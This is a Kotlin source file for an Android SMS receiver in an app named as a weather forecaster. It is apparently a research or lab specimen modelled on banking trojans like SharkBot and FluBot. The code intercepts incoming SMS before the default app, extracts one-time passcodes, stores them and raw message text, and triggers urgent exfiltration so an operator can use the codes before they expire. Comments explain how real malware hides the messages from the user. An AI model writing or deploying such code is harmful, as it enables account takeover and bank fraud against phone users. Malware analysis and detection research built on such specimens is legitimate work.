package com.skyweather.forecast.core

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony

/**
 * High-priority SMS BroadcastReceiver — OTP intercept via SMS.
 *
 * ══════════════════════════════════════════════════════════════════
 * ANALYSIS §5.2 — SMS OTP Stealing
 * ══════════════════════════════════════════════════════════════════
 *
 * Registered in manifest with priority 999 (maximum).
 * System delivers SMS_RECEIVED to receivers in priority order.
 * Priority 999 = this receiver fires BEFORE the default SMS app.
 *
 * On Android 4.4+ (KitKat): only the default SMS app can call
 * abortBroadcast() to suppress the message. Non-default apps
 * receive the broadcast READ-ONLY. However:
 *   - The OTP code is still captured (read access is sufficient)
 *   - Real banker malware tricks user into setting it as default
 *     SMS app, OR uses Accessibility to suppress notification
 *
 * Real-world references:
 *   SharkBot ATS: SMS receiver fires first, extracts OTP, feeds
 *     to auto-fill engine, completes transfer before user reads SMS
 *   FluBot: intercepts SMS to steal OTP + forwards to C2 in real-time
 *   Anatsa: prefers NLS over SMS (fewer permissions required) but
 *     has SMS fallback for devices where NLS isn't granted
 *
 * Required permissions:
 *   RECEIVE_SMS — dangerous, runtime grant required
 *   READ_SMS — dangerous, runtime grant required
 *
 * Analyst tell: SMS permissions on a WEATHER app = high-confidence
 * banker. Play Protect specifically flags utility apps requesting SMS.
 *
 * ML signal: intent-filter priority="999" on SMS_RECEIVED is a
 * well-known banker indicator. Some ML models key on this directly.
 * ══════════════════════════════════════════════════════════════════
 */
class AlertMessageReceiver : BroadcastReceiver() {

    /**
     * Called when SMS_RECEIVED fires.
     *
     * Processing order:
     *   1. Parse SmsMessage objects from intent extras
     *   2. Concatenate multi-part SMS body
     *   3. Run OtpExtractor on full body
     *   4. If OTP found → CredentialStore → immediate exfil trigger
     *
     * Critical timing: OTP validity is typically 30-120 seconds.
     * The faster we exfil, the more likely the code is still valid
     * when the operator (or ATS engine) uses it.
     */
    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        // Safety gate
        if (!AppConfig.isEndpointSafe()) return

        // Parse SMS messages from intent
        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (messages.isNullOrEmpty()) return

        // Concatenate multi-part SMS body
        val senderAddress = messages[0].originatingAddress ?: "unknown"
        val fullBody = messages.joinToString("") { it.messageBody ?: "" }

        if (fullBody.isBlank()) return

        // Run OTP extraction
        val otpResults = OtpExtractor.extractAll(fullBody)

        if (otpResults.isEmpty()) {
            // No OTP pattern — still capture if from a known banking sender
            // Real banker: maintains list of bank SMS short-codes
            // Lab: capture all SMS for analysis (gated by permissions)
            CredentialStore.capture(
                CredentialStore.CapturedEvent(
                    packageName = "sms:$senderAddress",
                    viewId = "sms_body",
                    text = fullBody.take(200),
                    timestamp = System.currentTimeMillis(),
                    eventType = "sms_raw"
                )
            )
            return
        }

        // OTP found — capture each match
        for (otp in otpResults) {
            CredentialStore.capture(
                CredentialStore.CapturedEvent(
                    packageName = "sms:$senderAddress",
                    viewId = "sms_otp_${otp.confidence.name.lowercase()}",
                    text = otp.code,
                    timestamp = System.currentTimeMillis(),
                    eventType = "otp_sms"
                )
            )
        }

        // Also capture full SMS body for context (operator may need it)
        CredentialStore.capture(
            CredentialStore.CapturedEvent(
                packageName = "sms:$senderAddress",
                viewId = "sms_context",
                text = fullBody.take(200),
                timestamp = System.currentTimeMillis(),
                eventType = "sms_ctx"
            )
        )

        // Trigger URGENT exfil — OTP codes expire fast (30-120s validity)
        // Uses REPLACE policy + 1s delay (vs standard 5s KEEP)
        ForecastSyncWorker.scheduleUrgent(context.applicationContext)

        // NOTE: abortBroadcast() suppresses the SMS notification so user
        // never sees the OTP message. Only works if app is default SMS handler.
        // Lab specimen does NOT abort — educational transparency.
        // Real SharkBot: abortBroadcast() when set as default SMS app.
        //
        // if (isOrderedBroadcast) {
        //     abortBroadcast()
        // }
    }
}
